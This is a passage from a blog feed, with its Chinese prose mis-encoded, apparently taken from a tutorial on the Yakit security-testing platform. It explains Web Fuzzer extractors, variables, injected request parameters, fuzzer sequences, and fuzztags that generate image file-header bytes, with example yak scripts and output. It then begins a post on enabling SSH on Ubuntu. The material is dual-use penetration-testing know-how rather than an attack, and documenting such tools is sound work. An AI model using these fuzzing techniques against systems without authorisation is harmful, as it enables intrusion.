style="zoom:40%;"><p>åœ¨ä¸Šè¿°ä¾‹å­ä¸­ï¼Œæˆ‘ä»¬åœ¨æœ€ä¸‹é¢ä¸€è¡Œä¸­å¡«å…¥xpathï¼š<code>/html/body/div[1]/p[2]/a</code>ï¼Œæ­¤æ—¶å¦‚æœç‚¹å‡»<strong>è°ƒè¯•æ‰§è¡Œ</strong>ï¼Œæˆ‘ä»¬å°±å¯ä»¥æ‹¿åˆ°å¯¹åº”çš„aæ ‡ç­¾å†…å®¹ï¼š<code>More information...</code>ã€‚å‡å¦‚æˆ‘ä»¬åœ¨ä¸Šé¢çš„<strong>Xpath å‚æ•°</strong>ä¸­å¡«å…¥<code>href</code>ï¼Œæˆ‘ä»¬å°±å¯ä»¥æå–åˆ°aæ ‡ç­¾çš„hrefå±æ€§ï¼š</p><p><code>https://www.iana.org/domains/example</code>ã€‚</p><p>å¯¹äº<strong>JQ</strong>è¿™ç§æå–ç±»å‹ï¼Œæˆ‘ä»¬ä»¥ä¸‹é¢çš„ä¾‹å­åšè®²è§£ï¼š</p><img src="/2024/12/24/gong-fang-gong-ju-ku/yakit-dan-bing-an-quan-neng-li-ping-tai/%E6%88%AA%E5%B1%8F2024-12-26%2010.59.32.png" style="zoom:50%;"><img src="/2024/12/24/gong-fang-gong-ju-ku/yakit-dan-bing-an-quan-neng-li-ping-tai/%E6%88%AA%E5%B1%8F2024-12-26%2010.59.52.png" style="zoom:40%;"><p>åœ¨ä¸Šè¿°ä¾‹å­ä¸­ï¼Œæˆ‘ä»¬å¯ä»¥çœ‹åˆ°å“åº”ä½“æ˜¯ä¸€æ®µjsonã€‚å‡å¦‚æˆ‘ä»¬æƒ³æå–headersä¸­Content-Typeçš„å€¼ï¼Œæˆ‘ä»¬åªéœ€è¦ä½¿ç”¨<code>.headers.["Content-Type"]</code>å³å¯ã€‚</p><h4 id="3ï¼‰å˜é‡"><a href="#3ï¼‰å˜é‡" class="headerlink" title="3ï¼‰å˜é‡"></a>3ï¼‰å˜é‡</h4><img src="/2024/12/24/gong-fang-gong-ju-ku/yakit-dan-bing-an-quan-neng-li-ping-tai/%E6%88%AA%E5%B1%8F2024-12-26%2011.01.19.png" style="zoom:50%;"><p>åœ¨ä¸Šè¿°<strong>æ•°æ®æå–å™¨</strong>å°èŠ‚ä¸­ï¼Œæˆ‘ä»¬æåˆ°æ•°æ®æå–å™¨çš„åå­—å¯ä»¥åœ¨å˜é‡ä¸­ä½¿ç”¨ï¼Œå®é™…ä¸Šå°±ç›¸å½“äºæˆ‘ä»¬èµ‹å€¼äº†ä¸€ä¸ªå˜é‡ã€‚åŒæ ·åœ°ï¼Œæˆ‘ä»¬ä¹Ÿå¯ä»¥ç›´æ¥åœ¨å˜é‡è¿™ä¸ªåœ°æ–¹ä¸Šç›´æ¥èµ‹å€¼å˜é‡ã€‚</p><p>åœ¨ä¸Šå›¾ä¸­ï¼Œæˆ‘ä»¬å¯ä»¥è®¾ç½®å˜é‡åå’Œå˜é‡å€¼ï¼Œå˜é‡å¯ä»¥åœ¨<strong>åç»­å˜é‡</strong>ï¼Œ<strong>Web Fuzzeråºåˆ—</strong>å’Œ<strong>å½“å‰Web Fuzzer</strong>ä¸­ä½¿ç”¨ã€‚æˆ‘ä»¬å¯ä»¥é€šè¿‡ä½¿ç”¨fuzztagï¼š<code>{{params(å˜é‡å)}}</code>æˆ–<code>{{p(å˜é‡å)}}</code>æ¥ä½¿ç”¨å˜é‡ã€‚</p><p>å˜é‡åŒæ ·å­˜åœ¨ä¸‰ç§æ¨¡å¼ï¼š<strong>nuclei</strong>ï¼Œ<strong>fuzztag</strong>ï¼Œ<strong>raw</strong>ã€‚</p><ol><li>nucleiï¼šnucleiæ¨¡å¼ä¸‹ï¼Œå…¶å˜é‡å€¼å®é™…ä¸Šæ˜¯nucleiçš„è¡¨è¾¾å¼ï¼Œå¯ä»¥è°ƒç”¨ç»å¤§éƒ¨åˆ†nuclei-dslä¸­åŒ…å«çš„å‡½æ•°ã€‚éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œå½“ä½ å¼•ç”¨å…¶ä»–å˜é‡æ—¶ï¼Œå…¶çš„å€¼éƒ½æ˜¯stringç±»å‹ï¼Œæ‰€ä»¥å¯èƒ½éœ€è¦æ‰‹åŠ¨è¿›è¡Œç±»å‹è½¬æ¢ã€‚ä¸€ä¸ªç®€å•çš„ä¾‹å­å¦‚ä¸‹ï¼š<code>{{int(a)+3}}</code>ã€‚</li><li>fuzztagï¼šfuzztaæ¨¡å¼ä¸‹ï¼Œå…¶å˜é‡å€¼å®é™…ä¸Šå°±æ˜¯fuzztagï¼Œåœ¨å€¼ä¸­ä½¿ç”¨fuzztagä¹Ÿä¼šä½¿å¾—Web Fuzzerå‘é€å¤šä¸ªè¯·æ±‚åŒ…ã€‚ä¸€ä¸ªç®€å•çš„ä¾‹å­å¦‚ä¸‹ï¼š<code>{{int(1-2)}}</code>ã€‚</li><li>rawï¼šrawæ¨¡å¼ä¸‹ï¼Œå˜é‡å€¼ç›¸å½“äºä½ è¾“å…¥çš„å­—ç¬¦ä¸²ï¼Œä¸ä¼šè¢«è§£æã€‚</li></ol><h4 id="4ï¼‰GET-å‚æ•°-POST-å‚æ•°-Cookie-Header"><a href="#4ï¼‰GET-å‚æ•°-POST-å‚æ•°-Cookie-Header" class="headerlink" title="4ï¼‰GET å‚æ•° / POST å‚æ•° / Cookie / Header"></a>4ï¼‰GET å‚æ•° / POST å‚æ•° / Cookie / Header</h4><img src="/2024/12/24/gong-fang-gong-ju-ku/yakit-dan-bing-an-quan-neng-li-ping-tai/%E6%88%AA%E5%B1%8F2024-12-26%2011.06.27.png" style="zoom:50%;"><p>è¿™äº›é…ç½®æ”¾åœ¨ä¸€èµ·è®²è§£ã€‚è®¾ç½®äº†è¿™äº›é…ç½®ä¹‹åï¼ŒWeb Fuzzerä¼šåœ¨å‘é€è¯·æ±‚åŒ…æ—¶æ·»åŠ å¯¹åº”çš„ GET å‚æ•° / POST å‚æ•° / Cookie / Headerå¹¶ä¸”<strong>é¢å¤–å‘é€è¯·æ±‚</strong>ï¼Œæ¯è®¾ç½®ä¸€ä¸ªå˜é‡å°±ä¼šé¢å¤–å‘é€ä¸€æ¬¡ã€‚</p><p>å¦‚æœæˆ‘ä»¬è®¾ç½®äº† GET å‚æ•°å˜é‡:<code>a=b</code> ä»¥åŠ Cookie: <code>c=d</code>ï¼Œå½“æˆ‘ä»¬ç‚¹å‡»å‘é€è¯·æ±‚æ—¶ï¼Œä¸€å…±å‘é€äº†3ä¸ªè¯·æ±‚åŒ…ï¼Œè¿™ä¸‰ä¸ªè¯·æ±‚åŒ…åˆ†åˆ«æ˜¯ï¼š</p><ol><li>åŸå§‹è¯·æ±‚ï¼Œæ²¡æœ‰åº”ç”¨ä»»ä½•å‚æ•°å˜é‡ã€‚</li><li>åº”ç”¨äº†å…¶ä¸­ä¸€ä¸ª GET å‚æ•°å˜é‡:<code>a=b</code>ï¼Œé¢å¤–å‘é€äº†ä¸€ä¸ªåŒ…å« GET å‚æ•°:<code>a=b</code>çš„è¯·æ±‚ã€‚</li><li>åº”ç”¨äº†å…¶ä¸­ä¸€ä¸ª Cookie å˜é‡:<code>c=d</code>ï¼Œé¢å¤–å‘é€äº†ä¸€ä¸ªåŒ…å« Cookie:<code>c=d</code>çš„è¯·æ±‚ã€‚</li></ol><p>åŒç†ï¼Œå‡å¦‚æˆ‘ä»¬é¢å¤–è®¾ç½®äº†ä¸€ä¸ª GET å‚æ•°å˜é‡:<code>e=f</code>ï¼Œé‚£ä¹ˆæˆ‘ä»¬å°±ä¼šé¢å¤–å‘é€ä¸€ä¸ªåŒ…å« GET å‚æ•°:<code>e=f</code>çš„è¯·æ±‚ã€‚</p><ul><li>å¦‚æœåŒä¸€ç§å‚æ•°è®¾ç½®äº†å¤šä¸ªå˜é‡ï¼šå¦‚ä¸‹</li></ul><img src="/2024/12/24/gong-fang-gong-ju-ku/yakit-dan-bing-an-quan-neng-li-ping-tai/%E6%88%AA%E5%B1%8F2024-12-26%2011.10.38.png" style="zoom:50%;"><p>ä¼šå‘é€ä¸‰ä¸ªè¯·æ±‚åŒ…ï¼š</p><ol><li>GET /?a=b HTTP/1.1 </li><li>GET /?a=b&amp;c=d HTTP/1.1</li><li>GET / HTTP/1.1</li></ol><h3 id="12-9-2-Web-Fuzzeråºåˆ—åŸºç¡€"><a href="#12-9-2-Web-Fuzzeråºåˆ—åŸºç¡€" class="headerlink" title="12.9.2 Web Fuzzeråºåˆ—åŸºç¡€"></a>12.9.2 Web Fuzzeråºåˆ—åŸºç¡€</h3><p>Web Fuzzer åºåˆ—å°±æ˜¯å°†å¤šä¸ª Web Fuzzer èŠ‚ç‚¹ä¸²è”èµ·æ¥ï¼Œå®ç°æ›´å¤æ‚çš„é€»è¾‘ä¸åŠŸèƒ½ã€‚ä¾‹å¦‚æˆ‘ä»¬éœ€è¦å…ˆè¿›è¡Œç™»å½•ï¼Œç„¶åå†è¿›è¡Œå…¶ä»–æ“ä½œï¼Œè¿™æ—¶å€™æˆ‘ä»¬å°±å¯ä»¥ä½¿ç”¨ Web Fuzzer åºåˆ—åŠŸèƒ½ã€‚</p><p>Web Fuzzeråºåˆ—å¦‚å›¾æ‰€ç¤ºï¼Œåœ¨æœ€å·¦ä¾§æœ‰ä¸€ä¸ª<strong>Fuzzer åºåˆ—</strong>æŒ‰é’®ï¼š</p><img src="/2024/12/24/gong-fang-gong-ju-ku/yakit-dan-bing-an-quan-neng-li-ping-tai/%E6%88%AA%E5%B1%8F2024-12-26%2011.13.30.png" style="zoom:50%;"><img src="/2024/12/24/gong-fang-gong-ju-ku/yakit-dan-bing-an-quan-neng-li-ping-tai/%E6%88%AA%E5%B1%8F2024-12-26%2011.15.35.png" style="zoom:50%;"><p>å½“æˆ‘ä»¬ç‚¹å‡» <code>Fuzzer åºåˆ—</code> æŒ‰é’®æ—¶ï¼Œä¼šå°† <code>WF-[1]</code>è¿™ä¸ªå­æ ‡ç­¾é¡µç»„æˆä¸€ä¸ªåºåˆ—ï¼Œå˜æˆå¦‚ä¸‹æ‰€ç¤ºï¼š</p><img src="/2024/12/24/gong-fang-gong-ju-ku/yakit-dan-bing-an-quan-neng-li-ping-tai/%E6%88%AA%E5%B1%8F2024-12-26%2011.16.01.png" style="zoom:50%;"><p>éšåæˆ‘ä»¬å¯ä»¥åœ¨ <code>Step [0]</code> è¿™ä¸ªèŠ‚ç‚¹ä¸­ï¼Œæ·»åŠ  <code>Web Fuzzer</code> çš„æ ‡ç­¾é¡µ<code>WF-[1]</code>ï¼Œè¿™ç›¸å½“äºåºåˆ—ä¸­è®¾ç½®ç¬¬ä¸€ä¸ªèŠ‚ç‚¹çš„è¯·æ±‚åŒ…ä¸º<code>WF-[1]</code>ã€‚</p><img src="/2024/12/24/gong-fang-gong-ju-ku/yakit-dan-bing-an-quan-neng-li-ping-tai/%E6%88%AA%E5%B1%8F2024-12-26%2011.16.52.png" style="zoom:50%;"><p>æˆ‘ä»¬è¿˜å¯ä»¥ç»§ç»­æ·»åŠ å…¶ä»–èŠ‚ç‚¹åˆ°åºåˆ—ä¸­ï¼Œåªéœ€è¦å°†å…¶ä»–æ ‡ç­¾é¡µæ‹–å…¥åºåˆ—ä¸­å³å¯ï¼š</p><img src="/2024/12/24/gong-fang-gong-ju-ku/yakit-dan-bing-an-quan-neng-li-ping-tai/%E6%88%AA%E5%B1%8F2024-12-26%2011.17.50.png" style="zoom:50%;"><p>æ¥ç€æˆ‘ä»¬åœ¨ <code>WF-[1]</code> ä¸­è®¾ç½®ä¸€ä¸ªæå–å™¨è§„åˆ™ï¼Œè§„åˆ™å†…å®¹æ˜¯æå–é”®å€¼ä¸º<code>Node1</code>çš„å€¼ï¼Œå£°æ˜ä¸º <code>get</code>å˜é‡ã€‚å†è®¾ç½®ä¸€ä¸ªå˜é‡ <code>node1</code>ï¼Œå†…å®¹æ˜¯<code>æˆ‘æ˜¯èŠ‚ç‚¹1ä¼ æ¥çš„å€¼</code>ï¼š</p><img src="/2024/12/24/gong-fang-gong-ju-ku/yakit-dan-bing-an-quan-neng-li-ping-tai/%E6%88%AA%E5%B1%8F2024-12-26%2011.19.16.png" style="zoom:50%;"><p>ç„¶åæˆ‘ä»¬åœ¨ <code>WF-[2]</code>ä¸­è®¾ç½®<code>WF-[1]</code>ä¸­å£°æ˜çš„å˜é‡ï¼Œå‡å¦‚æ­¤æ—¶æˆ‘ä»¬ç›´æ¥å‘é€è¯·æ±‚ï¼Œç»“æœä¼šä¸ºç©ºï¼Œè¿™æ˜¯å› ä¸ºå•ç‹¬å‘é€è¿™ä¸€ä¸ªè¯·æ±‚ï¼Œæ˜¯æ²¡æœ‰<code>WF-[1]</code>ä¸­å£°æ˜çš„å˜é‡çš„ï¼š</p><img src="/2024/12/24/gong-fang-gong-ju-ku/yakit-dan-bing-an-quan-neng-li-ping-tai/%E6%88%AA%E5%B1%8F2024-12-26%2011.20.00.png" alt="æˆªå±2024-12-26 11.20.00" style="zoom:50%;"><p>æœ€åæˆ‘ä»¬ä½¿ç”¨ <code>Fuzzer</code> åºåˆ—åŠŸèƒ½å°è¯•ä¸€ä¸‹ï¼Œåœ¨<code> WF-[1]</code>åˆ°<code>WF-[2]</code>çš„ä¸­é—´ï¼Œå¼€å¯<strong>ç»§æ‰¿å˜é‡</strong>é€‰é¡¹(é»˜è®¤å¼€å¯)ï¼Œç‚¹å‡»<code>å¼€å§‹æ‰§è¡Œ</code>æŒ‰é’®ï¼Œç­‰å¾…è¯·æ±‚ç»“æŸåï¼Œæˆ‘ä»¬æŸ¥çœ‹<code>WF-[2]</code>çš„å“åº”ï¼Œå‘ç°å®ƒå·²ç»æˆåŠŸä½¿ç”¨äº†åœ¨<code>WF-[1]</code>ä¸­è®¾ç½®çš„å˜é‡ï¼š</p><img src="/2024/12/24/gong-fang-gong-ju-ku/yakit-dan-bing-an-quan-neng-li-ping-tai/%E6%88%AA%E5%B1%8F2024-12-26%2011.22.22.png" style="zoom:50%;"><h1 id="åä¸‰ã€æ ‡ç­¾ä½¿ç”¨ç»éªŒç§¯ç´¯"><a href="#åä¸‰ã€æ ‡ç­¾ä½¿ç”¨ç»éªŒç§¯ç´¯" class="headerlink" title="åä¸‰ã€æ ‡ç­¾ä½¿ç”¨ç»éªŒç§¯ç´¯"></a>åä¸‰ã€æ ‡ç­¾ä½¿ç”¨ç»éªŒç§¯ç´¯</h1><h3 id="13-1-ã€æ–‡ä»¶å¤´æ ‡ç­¾ã€‘"><a href="#13-1-ã€æ–‡ä»¶å¤´æ ‡ç­¾ã€‘" class="headerlink" title="13.1 ã€æ–‡ä»¶å¤´æ ‡ç­¾ã€‘"></a>13.1 ã€æ–‡ä»¶å¤´æ ‡ç­¾ã€‘</h3><p><code>{{ico}}</code> <code>{{tiff}}</code> <code>{{gif}}</code> <code>{{png}}</code> <code>{{jpeg}}</code></p><p>yakå†…ç½®äº†å¾ˆå¼ºå¤§çš„åŠŸèƒ½ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡æŒ‡å®šæ–‡ä»¶å¤´æ ‡ç­¾ç›´æ¥å»ç”Ÿæˆæˆ‘ä»¬éœ€è¦çš„æ–‡ä»¶å¤´æ¥ä½¿ç”¨ã€‚</p><p>æˆ‘ä»¬å¯ä»¥ä½¿ç”¨<code>{{ico}}</code>æ¥ç›´æ¥ç”Ÿæˆä¸€ä¸ªicoçš„æ–‡ä»¶å¤´ï¼›å¯ä»¥ä½¿ç”¨<code>{{tiff}}</code>æ¥ç”Ÿæˆgifæ–‡ä»¶å¤´ï¼›ä½¿ç”¨<code>{{gif}}</code>æ¥ç”Ÿæˆgifæ–‡ä»¶å¤´ï¼›ä½¿ç”¨<code>{{png}}</code>æ¥ç”ŸæˆPNGæ–‡ä»¶å¤´ï¼›ä½¿ç”¨<code>{{jpeg}}</code>æ¥ ç”Ÿæˆjpeg/jpgæ–‡ä»¶å¤´ã€‚</p><ul><li>ä½¿ç”¨æ¡ˆä¾‹</li></ul><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">origin :<span class="token operator">=</span> <span class="token string">"randomStr: {{ico}}"</span>res :<span class="token operator">=</span> fuzz.Strings<span class="token punctuation">(</span>origin<span class="token punctuation">)</span>println<span class="token punctuation">(</span><span class="token string">"éœ€è¦æ¨¡ç³Šéšæœºæ¸²æŸ“çš„å­—ç¬¦ä¸²ä¸ºï¼š"</span>, origin<span class="token punctuation">)</span>println<span class="token punctuation">(</span><span class="token string">"æ¸²æŸ“ç»“æœä¸ºï¼š"</span><span class="token punctuation">)</span>dump<span class="token punctuation">(</span>res<span class="token punctuation">)</span>origin :<span class="token operator">=</span> <span class="token string">"randomStr: {{tiff}}"</span>res :<span class="token operator">=</span> fuzz.Strings<span class="token punctuation">(</span>origin<span class="token punctuation">)</span>println<span class="token punctuation">(</span><span class="token string">"éœ€è¦æ¨¡ç³Šéšæœºæ¸²æŸ“çš„å­—ç¬¦ä¸²ä¸ºï¼š"</span>, origin<span class="token punctuation">)</span>println<span class="token punctuation">(</span><span class="token string">"æ¸²æŸ“ç»“æœä¸ºï¼š"</span><span class="token punctuation">)</span>dump<span class="token punctuation">(</span>res<span class="token punctuation">)</span>origin :<span class="token operator">=</span> <span class="token string">"randomStr: {{gif}}"</span>res :<span class="token operator">=</span> fuzz.Strings<span class="token punctuation">(</span>origin<span class="token punctuation">)</span>println<span class="token punctuation">(</span><span class="token string">"éœ€è¦æ¨¡ç³Šéšæœºæ¸²æŸ“çš„å­—ç¬¦ä¸²ä¸ºï¼š"</span>, origin<span class="token punctuation">)</span>println<span class="token punctuation">(</span><span class="token string">"æ¸²æŸ“ç»“æœä¸ºï¼š"</span><span class="token punctuation">)</span>dump<span class="token punctuation">(</span>res<span class="token punctuation">)</span>origin :<span class="token operator">=</span> <span class="token string">"randomStr: {{png}}"</span>res :<span class="token operator">=</span> fuzz.Strings<span class="token punctuation">(</span>origin<span class="token punctuation">)</span>println<span class="token punctuation">(</span><span class="token string">"éœ€è¦æ¨¡ç³Šéšæœºæ¸²æŸ“çš„å­—ç¬¦ä¸²ä¸ºï¼š"</span>, origin<span class="token punctuation">)</span>println<span class="token punctuation">(</span><span class="token string">"æ¸²æŸ“ç»“æœä¸ºï¼š"</span><span class="token punctuation">)</span>dump<span class="token punctuation">(</span>res<span class="token punctuation">)</span>origin :<span class="token operator">=</span> <span class="token string">"randomStr: {{jpeg}}"</span>res :<span class="token operator">=</span> fuzz.Strings<span class="token punctuation">(</span>origin<span class="token punctuation">)</span>println<span class="token punctuation">(</span><span class="token string">"éœ€è¦æ¨¡ç³Šéšæœºæ¸²æŸ“çš„å­—ç¬¦ä¸²ä¸ºï¼š"</span>, origin<span class="token punctuation">)</span>println<span class="token punctuation">(</span><span class="token string">"æ¸²æŸ“ç»“æœä¸ºï¼š"</span><span class="token punctuation">)</span>dump<span class="token punctuation">(</span>res<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><ul><li>è¾“å‡ºçš„ç»“æœä¸ºï¼š</li></ul><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">éœ€è¦æ¨¡ç³Šéšæœºæ¸²æŸ“çš„å­—ç¬¦ä¸²ä¸ºï¼š randomStr: <span class="token punctuation">{</span><span class="token punctuation">{</span>ico<span class="token punctuation">}</span><span class="token punctuation">}</span>æ¸²æŸ“ç»“æœä¸ºï¼š<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token punctuation">]</span>string<span class="token punctuation">)</span> <span class="token punctuation">(</span>len<span class="token operator">=</span><span class="token number">1</span> <span class="token assign-left variable">cap</span><span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">{</span> <span class="token punctuation">(</span>string<span class="token punctuation">)</span> <span class="token punctuation">(</span>len<span class="token operator">=</span><span class="token number">19</span><span class="token punctuation">)</span> <span class="token string">"randomStr: <span class="token entity" title="\x00">\x00</span><span class="token entity" title="\x00">\x00</span><span class="token entity" title="\x01">\x01</span><span class="token entity" title="\x00">\x00</span><span class="token entity" title="\x01">\x01</span><span class="token entity" title="\x00">\x00</span>  "</span><span class="token punctuation">}</span>éœ€è¦æ¨¡ç³Šéšæœºæ¸²æŸ“çš„å­—ç¬¦ä¸²ä¸ºï¼š randomStr: <span class="token punctuation">{</span><span class="token punctuation">{</span>tiff<span class="token punctuation">}</span><span class="token punctuation">}</span>æ¸²æŸ“ç»“æœä¸ºï¼š<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token punctuation">]</span>string<span class="token punctuation">)</span> <span class="token punctuation">(</span>len<span class="token operator">=</span><span class="token number">2</span> <span class="token assign-left variable">cap</span><span class="token operator">=</span><span class="token number">2</span><span class="token punctuation">)</span> <span class="token punctuation">{</span> <span class="token punctuation">(</span>string<span class="token punctuation">)</span> <span class="token punctuation">(</span>len<span class="token operator">=</span><span class="token number">13</span><span class="token punctuation">)</span> <span class="token string">"randomStr: MM"</span>, <span class="token punctuation">(</span>string<span class="token punctuation">)</span> <span class="token punctuation">(</span>len<span class="token operator">=</span><span class="token number">13</span><span class="token punctuation">)</span> <span class="token string">"randomStr: II"</span><span class="token punctuation">}</span>éœ€è¦æ¨¡ç³Šéšæœºæ¸²æŸ“çš„å­—ç¬¦ä¸²ä¸ºï¼š randomStr: <span class="token punctuation">{</span><span class="token punctuation">{</span>gif<span class="token punctuation">}</span><span class="token punctuation">}</span>æ¸²æŸ“ç»“æœä¸ºï¼š<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token punctuation">]</span>string<span class="token punctuation">)</span> <span class="token punctuation">(</span>len<span class="token operator">=</span><span class="token number">1</span> <span class="token assign-left variable">cap</span><span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">{</span> <span class="token punctuation">(</span>string<span class="token punctuation">)</span> <span class="token punctuation">(</span>len<span class="token operator">=</span><span class="token number">17</span><span class="token punctuation">)</span> <span class="token string">"randomStr: GIF89a"</span><span class="token punctuation">}</span>éœ€è¦æ¨¡ç³Šéšæœºæ¸²æŸ“çš„å­—ç¬¦ä¸²ä¸ºï¼š randomStr: <span class="token punctuation">{</span><span class="token punctuation">{</span>png<span class="token punctuation">}</span><span class="token punctuation">}</span>æ¸²æŸ“ç»“æœä¸ºï¼š<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token punctuation">]</span>string<span class="token punctuation">)</span> <span class="token punctuation">(</span>len<span class="token operator">=</span><span class="token number">1</span> <span class="token assign-left variable">cap</span><span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">{</span> <span class="token punctuation">(</span>string<span class="token punctuation">)</span> <span class="token punctuation">(</span>len<span class="token operator">=</span><span class="token number">44</span><span class="token punctuation">)</span> <span class="token string">"randomStr: <span class="token entity" title="\x89">\x89</span>PNG<span class="token entity" title="\r">\r</span><span class="token entity" title="\n">\n</span><span class="token entity" title="\x1a">\x1a</span><span class="token entity" title="\n">\n</span><span class="token entity" title="\x00">\x00</span><span class="token entity" title="\x00">\x00</span><span class="token entity" title="\x00">\x00</span><span class="token entity" title="\r">\r</span>IHDR<span class="token entity" title="\x00">\x00</span><span class="token entity" title="\x00">\x00</span><span class="token entity" title="\x00">\x00</span><span class="token entity" title="\xce">\xce</span><span class="token entity" title="\x00">\x00</span><span class="token entity" title="\x00">\x00</span><span class="token entity" title="\x00">\x00</span><span class="token entity" title="\xce">\xce</span><span class="token entity" title="\b">\b</span><span class="token entity" title="\x02">\x02</span><span class="token entity" title="\x00">\x00</span><span class="token entity" title="\x00">\x00</span><span class="token entity" title="\x00">\x00</span><span class="token entity" title="\xf9">\xf9</span>}<span class="token entity" title="\xaa">\xaa</span><span class="token entity" title="\x93">\x93</span>"</span><span class="token punctuation">}</span>éœ€è¦æ¨¡ç³Šéšæœºæ¸²æŸ“çš„å­—ç¬¦ä¸²ä¸ºï¼š randomStr: <span class="token punctuation">{</span><span class="token punctuation">{</span>jpeg<span class="token punctuation">}</span><span class="token punctuation">}</span>æ¸²æŸ“ç»“æœä¸ºï¼š<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token punctuation">]</span>string<span class="token punctuation">)</span> <span class="token punctuation">(</span>len<span class="token operator">=</span><span class="token number">2</span> <span class="token assign-left variable">cap</span><span class="token operator">=</span><span class="token number">2</span><span class="token punctuation">)</span> <span class="token punctuation">{</span> <span class="token punctuation">(</span>string<span class="token punctuation">)</span> <span class="token punctuation">(</span>len<span class="token operator">=</span><span class="token number">23</span><span class="token punctuation">)</span> <span class="token string">"randomStr: <span class="token entity" title="\xff">\xff</span><span class="token entity" title="\xd8">\xd8</span><span class="token entity" title="\xff">\xff</span><span class="token entity" title="\xe0">\xe0</span><span class="token entity" title="\x00">\x00</span><span class="token entity" title="\x10">\x10</span>JFIF<span class="token entity" title="\xff">\xff</span><span class="token entity" title="\xd9">\xd9</span>"</span>, <span class="token punctuation">(</span>string<span class="token punctuation">)</span> <span class="token punctuation">(</span>len<span class="token operator">=</span><span class="token number">23</span><span class="token punctuation">)</span> <span class="token string">"randomStr: <span class="token entity" title="\xff">\xff</span><span class="token entity" title="\xd8">\xd8</span><span class="token entity" title="\xff">\xff</span><span class="token entity" title="\xe1">\xe1</span><span class="token entity" title="\x00">\x00</span><span class="token entity" title="\x1c">\x1c</span>Exif<span class="token entity" title="\xff">\xff</span><span class="token entity" title="\xd9">\xd9</span>"</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id=""><a href="#" class="headerlink" title=""></a></h3><h1 id="å‚è€ƒï¼š"><a href="#å‚è€ƒï¼š" class="headerlink" title="å‚è€ƒï¼š"></a>å‚è€ƒï¼š</h1><ul><li><a href="https://yaklang.com/products/intro">https://yaklang.com/products/intro</a> ã€å®˜æ–¹æ–‡æ¡£ã€‘</li></ul>]]></content>
      
      
      <categories>
          
          <category> æ”»é˜²å·¥å…·åº“ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> æ”»é˜²å·¥å…·åº“ </tag>
            
            <tag> Yakit </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ubuntuå¼€å¯sshæœåŠ¡</title>
      <link href="/2024/12/23/xi-tong-yun-wei/ubuntu-kai-qi-ssh-fu-wu/"/>
      <url>/2024/12/23/xi-tong-yun-wei/ubuntu-kai-qi-ssh-fu-wu/</url>
      
        <content type="html"><![CDATA[<h1 id="ä¸€ã€SSHç®€ä»‹"><a href="#ä¸€ã€SSHç®€ä»‹" class="headerlink" title="ä¸€ã€SSHç®€ä»‹"></a>ä¸€ã€SSHç®€ä»‹</h1><p>SSHï¼ˆSecure Shellï¼‰æ˜¯ä¸€ç§ç½‘ç»œåè®®ï¼Œç”¨äºåœ¨ç½‘ç»œä¸Šçš„è®¡ç®—æœºä¹‹é—´åŠ å¯†æ•°æ®ä¼ è¾“ï¼Œç‰¹åˆ«æ˜¯è¿œç¨‹ç™»å½•å’Œç®¡ç†ã€‚ä»¥ä¸‹æ˜¯SSHæœåŠ¡çš„ä¸€äº›åŸºæœ¬ä»‹ç»ï¼š</p><ol><li><strong>åŠ å¯†é€šä¿¡</strong>ï¼šSSHæä¾›äº†ä¸€ä¸ªå®‰å…¨çš„é€šé“ï¼Œé€šè¿‡è¿™ä¸ªé€šé“ï¼Œæ•°æ®ä¼ è¾“è¿‡ç¨‹ä¸­å¯ä»¥é˜²æ­¢çªƒå¬å’Œä¸­é—´äººæ”»å‡»ï¼Œç¡®ä¿æ•°æ®çš„æœºå¯†æ€§å’Œå®Œæ•´æ€§ã€‚</li><li><strong>è¿œç¨‹ç™»å½•</strong>ï¼šç”¨æˆ·å¯ä»¥é€šè¿‡SSHåè®®è¿œç¨‹ç™»å½•åˆ°æœåŠ¡å™¨ï¼Œæ‰§è¡Œå‘½ä»¤å’Œæ“ä½œï¼Œå°±åƒç›´æ¥åœ¨æœåŠ¡å™¨ä¸Šæ“ä½œä¸€æ ·ã€‚</li><li><strong>ç«¯å£è½¬å‘</strong>ï¼šSSHæ”¯æŒç«¯å£è½¬å‘åŠŸèƒ½ï¼Œå¯ä»¥å°†æœ¬åœ°ç«¯å£è½¬å‘åˆ°è¿œç¨‹æœåŠ¡å™¨ï¼Œå®ç°å®‰å…¨çš„æ•°æ®ä¼ è¾“ã€‚</li><li><strong>å¯†é’¥è®¤è¯</strong>ï¼šSSHæ”¯æŒåŸºäºå¯†é’¥çš„è®¤è¯æœºåˆ¶ï¼Œæä¾›æ¯”ä¼ ç»Ÿçš„ç”¨æˆ·åå’Œå¯†ç æ›´å®‰å…¨çš„è®¤è¯æ–¹å¼ã€‚</li><li><strong>å‘½ä»¤æ‰§è¡Œ</strong>ï¼šé€šè¿‡SSHï¼Œç”¨æˆ·å¯ä»¥åœ¨è¿œç¨‹æœåŠ¡å™¨ä¸Šæ‰§è¡Œå‘½ä»¤ï¼Œè¿›è¡Œæ–‡ä»¶ä¼ è¾“ï¼Œä»¥åŠç®¡ç†æœåŠ¡å’Œè¿›ç¨‹ã€‚</li><li><strong>å®‰å…¨æ€§</strong>ï¼šSSHåè®®ä½¿ç”¨å…¬é’¥åŠ 